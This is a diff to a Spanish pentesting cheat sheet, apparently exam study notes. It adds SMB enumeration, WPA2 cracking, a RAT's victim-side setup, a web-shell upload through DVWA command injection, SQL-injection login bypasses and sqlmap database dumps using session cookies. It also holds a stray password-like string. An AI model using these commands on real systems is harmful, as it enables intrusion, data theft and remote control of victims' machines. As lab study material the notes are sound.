@@ -139,6 +139,10 @@ nmap --script [categoria] [ip]
 ```
 **Enumeracion SMB**
 ```
+msfconsole
+auxiliary/scanner/smb/smb_enumusers --> enumera usuarios con el wordlist
+auxiliary/scanner/smb/smb_enumshares --> enumera carpetas compartidas
+nvkwj2387
 nmap --script smb-os-discovery.nse [ip]
 nmap -sU -sS --script smb-enum-users.nse -p U:137, T:139 [ip]
 nmap --script smb-enum-users.nse -p 445 [ip]
@@ -166,6 +170,8 @@ nmap -sV --script=http-enum [www.dominio.com]
 ```
 ## Steganography
 Nota: El archivo a descifrar debe estar en la **misma** carpeta que snow.exe
+
+Consejo: Con imagenes, si no funciona normal, cambia el formato a .png o .bmp desde Fotos o Paint, en "Guardar como"
 ```
 snow -C -m "[mensaje que se quiere colocar]" -p "[password]" [archivo que se va a mostrar] [archivo que tiene el mensaje oculto]
 snow -C -p "[password]" [archivo que se quiere decodificar]
@@ -201,6 +207,8 @@ aircrack-ng -a2 -b [Target BSSID] -w [password_wordlist.txt] [WPA2 pcap file]
 Para identificar el BSSID primero se intenta con el comando de arriba, si no lo arroja, se abre Wireshark --> Columna Info dice "Probe response" --> Se selecciona el paquete --> Categoria IEEE 802.11 Probe Response --> MAC de Source Address (BSSID)
 ```
 ## Criptography
+hashes.com y crackstation.net
+
 Para **generar HASH de archivos** --> hashcalc (Windows)
 
 Para **desencriptar archivos** --> Cryptool (Windows, si no mencionan el Key length se presiona directamente decrypt, recuerda al buscar el archivo que este seleccionada en la ventana la opcion All Files (.*)) Posibles algoritmos: RC4 Key Length 8 bits hexadecimales en 14 y DES(ECB)
@@ -269,6 +277,8 @@ Para detectar empaquetamientos y ofuscacion: **PEiD**
 
 Para EntryPoint, hash, entropia, etc: **DIE** --> Subir el archivo, escanear, y darle a "Advanced" --> Cambiar el file type hasta que coincida con el patron. 
 
+Para **RAT** --> **Theef** El servidor se instala en la victima y el cliente es lo que controla el RAT. Permite las conexiones a traves del puerto 9871. El puerto en la interfaz del cliente se deja por defecto: 6703 y FTP 2968. 
+
 Para PE, section headers: **PE Explorer**
 ## Hacking Web Applications
 wpscan NOTA: --random-user-agent: Permite evadir WAF
@@ -333,6 +343,8 @@ En nivel MEDIO se hace el mismo procedimiento, a diferencia de que se crea un ar
 En nivel ALTO se hace el mismo procedimiento pero se guarda el archivo pluma como .jpeg y se agrega en la primera linea GIF98, luego en la seccion de Command Injection de DVWA se coloca: | copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php (simplemente se copia el archivo cambiandole el nombre y extension) 
 ```
 ## SQLi
+
+Recuerda intentar primero escaneando el sitio con OWASP ZAP para que te diga especificamente la URL y el parametro vulnerable. Tambien se puede intentar tambien con nmap --script vuln [url o ip]
 **Authentication Bypass**
 ```
 '-- (en el campo de usuario y se coloca cualquier cosa en contrasena)
@@ -344,11 +356,14 @@ IDOR --> Luego del authentication bypass o del login, ir iterando hasta consegui
 En "Inspeccionar" en el navegador, en la pestana "Console" se escribe document.cookie
 Ahora se ejecuta SQLmap con esa cookie:
 
-CHEQUEA LA BASE DE DATOS
-sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --dbs
+CON REQUEST DE BURPSUITE, despues de obtener la URL vulnerable con OWASP ZAP (PRIMERO SE GUARDA EL REQUEST DE BURPSUITE EN UN ARCHIVO .txt:
+sqlmap -r [archivo.txt] --dbs 
+
+CHEQUEA NOMBRES DE LAS BASES DE DATOS
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=ykPje8QB; security=low" --dbs
 
 CHEQUEA LAS TABLAS DE LA BASE DE DATOS
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] --tables
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=abc123; security=low" -D [database_name] --tables
 
 CHEQUEA LAS COLUMNAS DE LA TABLA
 sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --columns
